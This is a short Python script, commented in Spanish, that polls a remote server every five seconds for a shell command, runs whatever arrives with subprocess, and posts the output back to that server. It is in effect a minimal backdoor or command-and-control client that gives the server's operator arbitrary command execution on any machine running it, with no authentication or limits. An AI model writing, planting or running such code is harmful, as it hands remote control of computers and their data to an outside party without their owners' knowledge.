import requests, subprocess, time

SERVER  = "https://control-remote.onrender.com"
ID      = "cliente1"

while True:
    try:
        # ─── 1) recoge comando ─────────────────────────────────────────────
        cmd = requests.get(f"{SERVER}/cmd/{ID}", timeout=10).text.strip()
        if cmd:
            print(f"[>] Ejecutando: {cmd}")
            salida = subprocess.getoutput(cmd)

            # ─── 2) envía resultado ───────────────────────────────────────
            requests.post(f"{SERVER}/out/{ID}", data=salida.encode(), timeout=10)
    except Exception as e:
        print("[!] Error:", e)
    time.sleep(5)
